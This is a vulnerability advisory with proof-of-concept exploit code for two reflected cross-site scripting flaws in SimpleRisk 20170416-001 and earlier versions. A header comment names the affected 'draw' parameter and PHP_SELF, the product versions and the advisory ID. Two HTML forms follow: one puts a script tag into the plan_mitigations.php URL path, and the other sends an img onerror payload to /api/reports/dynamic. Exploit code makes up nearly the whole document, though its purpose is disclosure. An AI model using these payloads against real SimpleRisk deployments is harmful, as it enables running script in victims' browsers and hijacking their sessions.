@@ -1,0 +1,281 @@
+<!--
+
+SimpleRisk v20170416-001 Reflected XSS Vulnerabilities
+
+
+Vendor: SimpleRisk, LLC
+Product web page: https://www.simplerisk.com
+Affected version: 20170416-001
+                  20170108-001
+                  20170102-001
+
+Summary: SimpleRisk is an open-source risk management system released
+under Mozilla Public License and used for risk management activities.
+It enables risk managers to account for risks, plan mitigation measures,
+facilitate management reviews, prioritize for project planning, and track
+periodic reviews.
+
+Desc: SimpleRisk suffers from two reflected cross-site scripting vulnerabilities
+when input passed via 'draw' POST parameter and the 'PHP_SELF' variable is not
+properly sanitized before being returned to the user. This can be exploited to
+execute arbitrary HTML and script code in a user's browser session in context of
+an affected site.
+
+Tested on: PHP/5.5.9-1ubuntu4.20
+           Apache/2.4.7 (Ubuntu)
+           MySQL 14.14 (Distrib 5.5.53 for debian-linux-gnu)
+           Ubuntu 14.04.5 LTS
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5414
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5414.php
+
+
+05.06.2017
+
+-->
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://192.168.1.72/management/plan_mitigations.php/'><script>alert(1)</script>">
+      <input type="hidden" name="currentpage" value="/ZSL" />
+      <input type="submit" value="XSS #1" />
+    </form>
+  </body>
+</html>
+
+=====
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://192.168.1.72/api/reports/dynamic" method="POST">
+      <input type="hidden" name="draw" value="&lt;img&#32;src&#61;a&#32;onerror&#61;alert&#40;&apos;XSS&#45;251&apos;&#41;&gt;ZSL&#32;XSSed" />
+      <input type="hidden" name="columns&#91;0&#93;&#91;data&#93;" value="0" />
+      <input type="hidden" name="columns&#91;0&#93;&#91;name&#93;" value="id" />
+      <input type="hidden" name="columns&#91;0&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;0&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;0&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;0&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;1&#93;&#91;data&#93;" value="1" />
+      <input type="hidden" name="columns&#91;1&#93;&#91;name&#93;" value="risk&#95;status" />
+      <input type="hidden" name="columns&#91;1&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;1&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;1&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;1&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;2&#93;&#91;data&#93;" value="2" />
+      <input type="hidden" name="columns&#91;2&#93;&#91;name&#93;" value="subject" />
+      <input type="hidden" name="columns&#91;2&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;2&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;2&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;2&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;3&#93;&#91;data&#93;" value="3" />
+      <input type="hidden" name="columns&#91;3&#93;&#91;name&#93;" value="reference&#95;id" />
+      <input type="hidden" name="columns&#91;3&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;3&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;3&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;3&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;4&#93;&#91;data&#93;" value="4" />
+      <input type="hidden" name="columns&#91;4&#93;&#91;name&#93;" value="regulation" />
+      <input type="hidden" name="columns&#91;4&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;4&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;4&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;4&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;5&#93;&#91;data&#93;" value="5" />
+      <input type="hidden" name="columns&#91;5&#93;&#91;name&#93;" value="control&#95;number" />
+      <input type="hidden" name="columns&#91;5&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;5&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;5&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;5&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;6&#93;&#91;data&#93;" value="6" />
+      <input type="hidden" name="columns&#91;6&#93;&#91;name&#93;" value="location" />
+      <input type="hidden" name="columns&#91;6&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;6&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;6&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;6&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;7&#93;&#91;data&#93;" value="7" />
+      <input type="hidden" name="columns&#91;7&#93;&#91;name&#93;" value="source" />
+      <input type="hidden" name="columns&#91;7&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;7&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;7&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;7&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;8&#93;&#91;data&#93;" value="8" />
+      <input type="hidden" name="columns&#91;8&#93;&#91;name&#93;" value="category" />
+      <input type="hidden" name="columns&#91;8&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;8&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;8&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;8&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;9&#93;&#91;data&#93;" value="9" />
+      <input type="hidden" name="columns&#91;9&#93;&#91;name&#93;" value="team" />
+      <input type="hidden" name="columns&#91;9&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;9&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;9&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;9&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;10&#93;&#91;data&#93;" value="10" />
+      <input type="hidden" name="columns&#91;10&#93;&#91;name&#93;" value="technology" />
+      <input type="hidden" name="columns&#91;10&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;10&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;10&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;10&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;11&#93;&#91;data&#93;" value="11" />
+      <input type="hidden" name="columns&#91;11&#93;&#91;name&#93;" value="owner" />
+      <input type="hidden" name="columns&#91;11&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;11&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;11&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;11&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;12&#93;&#91;data&#93;" value="12" />
+      <input type="hidden" name="columns&#91;12&#93;&#91;name&#93;" value="manager" />
+      <input type="hidden" name="columns&#91;12&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;12&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;12&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;12&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;13&#93;&#91;data&#93;" value="13" />
+      <input type="hidden" name="columns&#91;13&#93;&#91;name&#93;" value="submitted&#95;by" />
+      <input type="hidden" name="columns&#91;13&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;13&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;13&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;13&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;14&#93;&#91;data&#93;" value="14" />
+      <input type="hidden" name="columns&#91;14&#93;&#91;name&#93;" value="scoring&#95;method" />
+      <input type="hidden" name="columns&#91;14&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;14&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;14&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;14&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;15&#93;&#91;data&#93;" value="15" />
+      <input type="hidden" name="columns&#91;15&#93;&#91;name&#93;" value="calculated&#95;risk" />
+      <input type="hidden" name="columns&#91;15&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;15&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;15&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;15&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;16&#93;&#91;data&#93;" value="16" />
+      <input type="hidden" name="columns&#91;16&#93;&#91;name&#93;" value="submission&#95;date" />
+      <input type="hidden" name="columns&#91;16&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;16&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;16&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;16&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;17&#93;&#91;data&#93;" value="17" />
+      <input type="hidden" name="columns&#91;17&#93;&#91;name&#93;" value="review&#95;date" />
+      <input type="hidden" name="columns&#91;17&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;17&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;17&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;17&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;18&#93;&#91;data&#93;" value="18" />
+      <input type="hidden" name="columns&#91;18&#93;&#91;name&#93;" value="project" />
+      <input type="hidden" name="columns&#91;18&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;18&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;18&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;18&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;19&#93;&#91;data&#93;" value="19" />
+      <input type="hidden" name="columns&#91;19&#93;&#91;name&#93;" value="mitigation&#95;planned" />
+      <input type="hidden" name="columns&#91;19&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;19&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;19&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;19&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;20&#93;&#91;data&#93;" value="20" />
+      <input type="hidden" name="columns&#91;20&#93;&#91;name&#93;" value="management&#95;review" />
+      <input type="hidden" name="columns&#91;20&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;20&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;20&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;20&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;21&#93;&#91;data&#93;" value="21" />
+      <input type="hidden" name="columns&#91;21&#93;&#91;name&#93;" value="days&#95;open" />
+      <input type="hidden" name="columns&#91;21&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;21&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;21&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;21&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;22&#93;&#91;data&#93;" value="22" />
+      <input type="hidden" name="columns&#91;22&#93;&#91;name&#93;" value="next&#95;review&#95;date" />
+      <input type="hidden" name="columns&#91;22&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;22&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;22&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;22&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;23&#93;&#91;data&#93;" value="23" />
+      <input type="hidden" name="columns&#91;23&#93;&#91;name&#93;" value="next&#95;step" />
+      <input type="hidden" name="columns&#91;23&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;23&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;23&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;23&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;24&#93;&#91;data&#93;" value="24" />
+      <input type="hidden" name="columns&#91;24&#93;&#91;name&#93;" value="affected&#95;assets" />
+      <input type="hidden" name="columns&#91;24&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;24&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;24&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;24&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;25&#93;&#91;data&#93;" value="25" />
+      <input type="hidden" name="columns&#91;25&#93;&#91;name&#93;" value="risk&#95;assessment" />
+      <input type="hidden" name="columns&#91;25&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;25&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;25&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;25&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;26&#93;&#91;data&#93;" value="26" />
+      <input type="hidden" name="columns&#91;26&#93;&#91;name&#93;" value="additional&#95;notes" />
+      <input type="hidden" name="columns&#91;26&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;26&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;26&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;26&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;27&#93;&#91;data&#93;" value="27" />
+      <input type="hidden" name="columns&#91;27&#93;&#91;name&#93;" value="current&#95;solution" />
+      <input type="hidden" name="columns&#91;27&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;27&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;27&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;27&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;28&#93;&#91;data&#93;" value="28" />
+      <input type="hidden" name="columns&#91;28&#93;&#91;name&#93;" value="security&#95;recommendations" />
+      <input type="hidden" name="columns&#91;28&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;28&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;28&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;28&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;29&#93;&#91;data&#93;" value="29" />
+      <input type="hidden" name="columns&#91;29&#93;&#91;name&#93;" value="security&#95;requirements" />
+      <input type="hidden" name="columns&#91;29&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;29&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;29&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;29&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;30&#93;&#91;data&#93;" value="30" />
+      <input type="hidden" name="columns&#91;30&#93;&#91;name&#93;" value="planning&#95;strategy" />
+      <input type="hidden" name="columns&#91;30&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;30&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;30&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;30&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;31&#93;&#91;data&#93;" value="31" />
+      <input type="hidden" name="columns&#91;31&#93;&#91;name&#93;" value="mitigation&#95;effort" />
+      <input type="hidden" name="columns&#91;31&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;31&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;31&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;31&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;32&#93;&#91;data&#93;" value="32" />
+      <input type="hidden" name="columns&#91;32&#93;&#91;name&#93;" value="mitigation&#95;cost" />
+      <input type="hidden" name="columns&#91;32&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;32&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;32&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;32&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;33&#93;&#91;data&#93;" value="33" />
+      <input type="hidden" name="columns&#91;33&#93;&#91;name&#93;" value="mitigation&#95;owner" />
+      <input type="hidden" name="columns&#91;33&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;33&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;33&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;33&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="columns&#91;34&#93;&#91;data&#93;" value="34" />
+      <input type="hidden" name="columns&#91;34&#93;&#91;name&#93;" value="mitigation&#95;team" />
+      <input type="hidden" name="columns&#91;34&#93;&#91;searchable&#93;" value="true" />
+      <input type="hidden" name="columns&#91;34&#93;&#91;orderable&#93;" value="false" />
+      <input type="hidden" name="columns&#91;34&#93;&#91;search&#93;&#91;value&#93;" value="" />
+      <input type="hidden" name="columns&#91;34&#93;&#91;search&#93;&#91;regex&#93;" value="false" />
+      <input type="hidden" name="start" value="0" />
+      <input type="hidden" name="length" value="10" />
+      <input type="hidden" name="search&#91;value&#93;" value="" />
+      <input type="hidden" name="search&#91;regex&#93;" value="false" />
+      <input type="hidden" name="status" value="0" />
+      <input type="hidden" name="group" value="0" />
+      <input type="hidden" name="sort" value="0" />
+      <input type="hidden" name="group&#95;value" value="" />
+      <input type="submit" value="XSS #2" />
+    </form>
+  </body>
+</html>
